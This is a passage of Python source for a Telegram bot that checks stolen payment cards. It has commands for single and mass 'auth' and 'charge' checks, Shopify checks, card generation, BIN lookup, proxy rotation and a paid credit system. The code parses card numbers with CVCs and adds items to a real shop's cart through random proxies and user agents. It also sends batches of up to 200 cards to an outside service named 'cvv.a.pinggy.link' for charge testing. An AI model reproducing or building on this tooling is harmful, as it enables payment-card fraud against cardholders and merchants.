                AWAIT_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            },
            fallbacks=[],
            allow_reentry=True,
            block=False,
        )
        app.add_handler(conv_handler)
    except Exception as e:
        logger.warning(f"ConversationHandler setup failed: {e}")

    # ========== REGISTER ALL HANDLERS ==========
    # Basic commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", start_command))
    app.add_handler(CommandHandler("register", cmd_register))
    
    # Card checker commands (enhanced with UI)
    app.add_handler(CommandHandler("auth", auth_cmd))
    app.add_handler(CommandHandler("charge", charge_cmd))
    app.add_handler(CommandHandler("mauth", mauth_cmd))
    app.add_handler(CommandHandler("mcharge", mcharge_cmd))
    app.add_handler(CommandHandler("shopify", shopify_cmd))
    app.add_handler(CommandHandler("mshopify", mshopify_cmd))
    app.add_handler(CommandHandler("shopify2", shopify2_cmd))
    app.add_handler(CommandHandler("mshopify2", mshopify2_cmd))
    
    # Legacy checker commands
    app.add_handler(CommandHandler("sh", sh_command))
    app.add_handler(CommandHandler("st", st_command))
    
    # Tools
    app.add_handler(CommandHandler("sort", sort_command))
    app.add_handler(CommandHandler("split", split_cmd))
    app.add_handler(CommandHandler("sortf", sortf_cmd))
    app.add_handler(CommandHandler("gen", cmd_gen))
    app.add_handler(CommandHandler("bin", cmd_bin))
    app.add_handler(CommandHandler("scan", cmd_scan))
    app.add_handler(CommandHandler("cko", cko_full_cmd))
    app.add_handler(CommandHandler("stc", cmd_stc))
    app.add_handler(CommandHandler("magic", magic_command))
    app.add_handler(CommandHandler("pp", pp_command))
    app.add_handler(CommandHandler("bk", bk_command))
    app.add_handler(CommandHandler("msh", msh_command))
    
    # Proxy management
    app.add_handler(CommandHandler("addproxy", add_proxy))
    app.add_handler(CommandHandler("removeproxies", remove_proxies))
    app.add_handler(CommandHandler("myproxies", my_proxies))
    
    # Credits & redemption
    app.add_handler(CommandHandler("credits", check_credits))
    app.add_handler(CommandHandler("redeem", redeem_code))
    
    # Mass operations
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stopmass", stop_mass_command))
    
    # Statistics & leaderboard
    app.add_handler(CommandHandler("stats", show_stats))
    app.add_handler(CommandHandler("leaderboard", show_leaderboard))
    
    # Admin commands
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("gift", generate_gift))
    app.add_handler(CommandHandler("addcredits", add_credits_admin))
    app.add_handler(CommandHandler("pro", cmd_promote))
    app.add_handler(CommandHandler("demo", cmd_demote))
    app.add_handler(CommandHandler("admins", cmd_admins))
    app.add_handler(CommandHandler("news", news_cmd))
    app.add_handler(CommandHandler("scr", scr_cmd))
    
    # ========== CALLBACK QUERY HANDLER (ENHANCED UI) ==========
    # This handles all inline keyboard button clicks
    app.add_handler(CallbackQueryHandler(main_callback_handler))
    app.add_handler(CallbackQueryHandler(scan_callback_handler))
    
    # Document handler
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, mass_document_handler))
 
    print("╔═══════════════════════════════════╗")
    print("║   🚀 BOT RUNNING WITH ENHANCED UI  ║")
    print("║   ✨ Multi-User Support: ACTIVE    ║")
    print("║   🎨 Inline Keyboards: ENABLED     ║")
    print("║   ⚡ Animations: ON                 ║")
    print("║   🛍️ Autoshopify Integration: ON    ║")
    print("╚═══════════════════════════════════╝")
    
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()


# ---- APPENDED AUTO-ADDED: process-pool sh_check + _mp_worker (overrides previous defs) ----
import os
from concurrent.futures import ProcessPoolExecutor
PROCESS_POOL = None
PROCESS_POOL_MAX_WORKERS = max(1, (os.cpu_count() or 2) - 0)

def initialize_process_pool(max_workers:int=None):
    global PROCESS_POOL, PROCESS_POOL_MAX_WORKERS
    if max_workers:
        PROCESS_POOL_MAX_WORKERS = max_workers
    if PROCESS_POOL is None:
        PROCESS_POOL = ProcessPoolExecutor(max_workers=PROCESS_POOL_MAX_WORKERS)

def shutdown_process_pool():
    global PROCESS_POOL
    try:
        if PROCESS_POOL:
            PROCESS_POOL.shutdown(wait=False)
    finally:
        PROCESS_POOL = None

def _mp_worker(card_details: str, username: str = None, proxy_list_snapshot=None):
    import time, re, random
    import requests
    try:
        from fake_useragent import UserAgent
    except Exception:
        UserAgent = None

    start_time = time.time()

    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    m = re.search(pattern, card_details)
    if not m:
        return {"error":"Invalid card format"}

    n = m.group(1)
    mm_raw = m.group(2)
    yy_raw = m.group(3)
    cvc = m.group(4)
    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    else:
        yy = yy_raw

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"

    session = requests.Session()
    if proxy_list_snapshot:
        try:
            proxy = random.choice(proxy_list_snapshot)
            session.proxies.update(proxy)
        except Exception:
            pass

    ua = None
    if UserAgent:
        try:
            ua = UserAgent()
        except Exception:
            ua = None
    user_agent = ua.random if ua else "Mozilla/5.0 (compatible)"

    headers = {"User-Agent": user_agent, "Content-Type": "application/x-www-form-urlencoded"}

    try:
        add_url = "https://violettefieldthreads.com/cart/add.js"
        data = {"id":"39379910480095","quantity":"1"}
        r = session.post(add_url, headers=headers, data=data, timeout=15)
        if r.status_code >= 400:
            return {"error":f"Add-to-cart failed {r.status_code}", "full_card": full_card}
    except Exception as e:
        return {"error":f"Add-to-cart exception: {e}", "full_card": full_card}

    elapsed = time.time() - start_time
    return {
        "full_card": full_card,
        "status": "unknown",
        "resp_msg": "",
        "elapsed_time": f"{elapsed:.2f}s",
        "bin": n[:6],
        "bin_info": {}
    }

async def sh_check(card_details, username, msg=None):
    try:
        import asyncio
        loop = asyncio.get_running_loop()
    except Exception:
        loop = None

    if msg:
        try:
            await msg.reply_text(f"Checking: {card_details}")
        except Exception:
            pass

    try:
        initialize_process_pool()
    except Exception:
        pass

    try:
        proxy_snapshot = list(proxy_list) if ('proxy_list' in globals() and proxy_list) else None
    except Exception:
        proxy_snapshot = None

    try:
        if loop:
            result = await loop.run_in_executor(PROCESS_POOL, _mp_worker, card_details, username, proxy_snapshot)
        else:
            result = _mp_worker(card_details, username, proxy_snapshot)
    except Exception as e:
        result = {"error": f"sh_check submission failed: {e}"}
    return result

# ---- END APPENDED BLOCK ----




# --------------------- CARD CHECKER INTEGRATION (Pinggy) ---------------------
# Adds /auth and /charge single checks and /mauth (reply to text file) and /mcharge (list in command)
import asyncio
import requests
from concurrent.futures import ThreadPoolExecutor
COOKIE = {"validated_bot": "1"}
PINGGY_BASE = "https://cvv.a.pinggy.link"
PINGGY_HEADERS = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
MAX_MAUTH = 200  # maximum cards for /mauth
MAUTH_WORKERS = 10  # threadpool workers for mass checks

def pinggy_parse(card_text):
    try:
        r = requests.post(f"{PINGGY_BASE}/api/parse_cards", json={"input_text": card_text}, headers=PINGGY_HEADERS, cookies=COOKIE, timeout=15)
        j = r.json()
        return j.get("cards", [None])[0]
    except Exception as e:
        return None

def pinggy_start(cards_list, mode="auth"):
    endpoint = "/api/start_checking" if mode == "auth" else "/api/start_checking_charged"
    try:
        r = requests.post(f"{PINGGY_BASE}{endpoint}", json={"cards": cards_list}, headers=PINGGY_HEADERS, cookies=COOKIE, timeout=15)
        return r.json().get("session_id")
    except Exception:
        return None

def pinggy_get_progress(session_id):
    try:
        r = requests.get(f"{PINGGY_BASE}/api/get_progress/{session_id}", headers=PINGGY_HEADERS, cookies=COOKIE, timeout=15)
        return r.json()
    except Exception:
        return None

async def _run_single_check(card_text, mode="auth"):
    parsed = await asyncio.get_running_loop().run_in_executor(None, pinggy_parse, card_text)
    if not parsed:
        return {"input": card_text, "error": "parse_failed"}
    session = await asyncio.get_running_loop().run_in_executor(None, pinggy_start, [parsed], mode)
    if not session:
        return {"input": card_text, "error": "start_failed"}
    # poll progress
    while True:
        j = await asyncio.get_running_loop().run_in_executor(None, pinggy_get_progress, session)
        if not j:
            await asyncio.sleep(0.4)
            continue
        total = j.get("total", 0)
        counters = j.get("counters", {})
        results = j.get("results", [])
        if results and counters.get("total_checked", 0) >= total:
            return {"input": card_text, "result": results[0] if results else None}
        await asyncio.sleep(0.4)

# /auth and /charge single-command handlers
async def cmd_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2 and not update.message.reply_to_message:
        await update.message.reply_text("Usage: /auth <card>  or reply to a message containing the card")
        return
    card_input = parts[1] if len(parts) >= 2 else (update.message.reply_to_message.text or "")
    await update.message.reply_text("Starting auth check...")
    res = await _run_single_check(card_input, mode="auth")
    out = _format_single_result(res)
    await update.message.reply_text(out, parse_mode="HTML")

async def cmd_charge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2 and not update.message.reply_to_message:
        await update.message.reply_text("Usage: /charge <card>  or reply to a message containing the card")
        return
    card_input = parts[1] if len(parts) >= 2 else (update.message.reply_to_message.text or "")
    await update.message.reply_text("Starting charge check...")
    res = await _run_single_check(card_input, mode="charge")
    out = _format_single_result(res)
    await update.message.reply_text(out, parse_mode="HTML")

def _format_single_result(res):
    if not res:
        return "No result."
    if res.get("error"):
        return f"<b>Card:</b> {html_escape(res.get('input'))}\n<b>Error:</b> {html_escape(res.get('error'))}"
    r = res.get("result") or {}
    status = r.get("status") or "unknown"
    gateway = r.get("gateway") or ""
    message = r.get("message") or ""
    resp = r.get("response_code") or ""
    check_time = r.get("check_time") or ""
    return (f"<b>Card:</b> {html_escape(res.get('input'))}\n"
            f"<b>Status:</b> {html_escape(status)}\n"
            f"<b>Gateway:</b> {html_escape(gateway)}\n"
            f"<b>Message:</b> {html_escape(message)}\n"
            f"<b>Resp:</b> {html_escape(resp)}\n"
            f"<b>Time:</b> {html_escape(str(check_time))}")

def html_escape(s):
    if s is None:
        return ""
    import html as _html
    return _html.escape(str(s))

# /mcharge <cc1> <cc2> ... <cc10>  (group-only)
async def cmd_mcharge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    if chat.type not in ("group", "supergroup"):
        await update.message.reply_text("This command only works inside groups.")
        return
    text = (update.message.text or "").strip()
    parts = text.split()[1:]
    if not parts:
        await update.message.reply_text("Usage: /mcharge <cc1> <cc2> ... (max 10)")
        return
    if len(parts) > 10:
        await update.message.reply_text("Maximum 10 cards per /mcharge invocation.")
        return
    msg = await update.message.reply_text(f"Starting mass charge for {len(parts)} cards...")
    results = []
    for i, cc in enumerate(parts, 1):
        await msg.edit_text(f"Checking {i}/{len(parts)}: {cc}")
        res = await _run_single_check(cc, mode="charge")
        results.append((cc, res))
    # prepare result file
    lines = []
    for cc, r in results:
        if r.get("error"):
            lines.append(f"{cc} => ERROR: {r.get('error')}")
        else:
            rr = r.get("result") or {}
            lines.append(f"{cc} => {rr.get('status')} | {rr.get('gateway')} | {rr.get('message')}")
    bio_path = "/tmp/mcharge_results.txt"
    with open(bio_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
    try:
        await update.message.reply_document(document=open(bio_path, "rb"))
    except Exception:
        await update.message.reply_text("Failed to send result file.")
    await msg.edit_text("Mass charge complete. Results sent.")

# /mauth (reply to text file) - group only, processes up to MAX_MAUTH cards, updates progress, sends result file
async def cmd_mauth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    if chat.type not in ("group", "supergroup"):
        await update.message.reply_text("This command only works inside groups.")
        return
    # must be reply to a message with a document or text
    reply = update.message.reply_to_message
    if not reply or not (reply.document or reply.text):
        await update.message.reply_text("Reply to a text file (or message containing cards) with /mauth to start mass auth checks.")
        return
    # collect cards
    cards = []
    if reply.document:
        # download document to temp and read lines
        f = await context.bot.get_file(reply.document.file_id)
        tmp_path = f"/tmp/mauth_{int(time.time())}.txt"
        await f.download_to_drive(tmp_path)
        with open(tmp_path, "r", encoding='utf-8', errors='ignore') as fh:
            for line in fh:
                line = line.strip()
                if line:
                    cards.append(line)
    else:
        # parse reply text lines
        for line in (reply.text or "").splitlines():
            line = line.strip()
            if line:
                cards.append(line)
    if not cards:
        await update.message.reply_text("No cards found in the provided file/message.")
        return
    # enforce limit
    if len(cards) > MAX_MAUTH:
        await update.message.reply_text(f"Too many cards in file. Max allowed: {MAX_MAUTH}. Found: {len(cards)}")
        return
    msg = await update.message.reply_text(f"Starting mauth for {len(cards)} cards... Progress: 0/{len(cards)}")
    results = []
    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(MAUTH_WORKERS)
    async def worker(card, idx):
        async with sem:
            await msg.edit_text(f"Progress: {idx+1}/{len(cards)} — checking {card}")
            return await _run_single_check(card, mode="auth")
    tasks = [worker(card, i) for i, card in enumerate(cards)]
    gathered = []
    for coro in asyncio.as_completed(tasks):
        res = await coro
        gathered.append(res)
    # Prepare output file
    out_lines = []
    for i, card in enumerate(cards):
        r = gathered[i] if i < len(gathered) else {}
        if r.get("error"):
            out_lines.append(f"{card} => ERROR: {r.get('error')}")
        else:
            rr = r.get("result") or {}
            out_lines.append(f"{card} => {rr.get('status')} | {rr.get('gateway')} | {rr.get('message')}")
    out_path = f"/tmp/mauth_results_{int(time.time())}.txt"
    with open(out_path, "w", encoding='utf-8') as fh:
        fh.write("\n".join(out_lines))
    try:
        await update.message.reply_document(document=open(out_path, "rb"))
    except Exception:
        await update.message.reply_text("Failed to send results file.")
    await msg.edit_text("Mass auth complete. Results sent.")

# Register handlers — try to add gracefully if Application 'app_ref' exists at import time
app = None  # Will be set in main()

def register_card_check_handlers(application):
    try:
        application.add_handler(CommandHandler('auth', cmd_auth))
        application.add_handler(CommandHandler('charge', cmd_charge))
        application.add_handler(CommandHandler('mauth', cmd_mauth))
        application.add_handler(CommandHandler('mcharge', cmd_mcharge))
        application.add_handler(CommandHandler('shopify', shopify_cmd))
        application.add_handler(CommandHandler('mshopify', mshopify_cmd))
    except Exception:
        pass

# If app variable exists in the global file, attempt to register now
if 'app' in globals() and app:
    try:
        register_card_check_handlers(app)
    except Exception:
        pass

# --------------------- END CARD CHECKER ---------------------
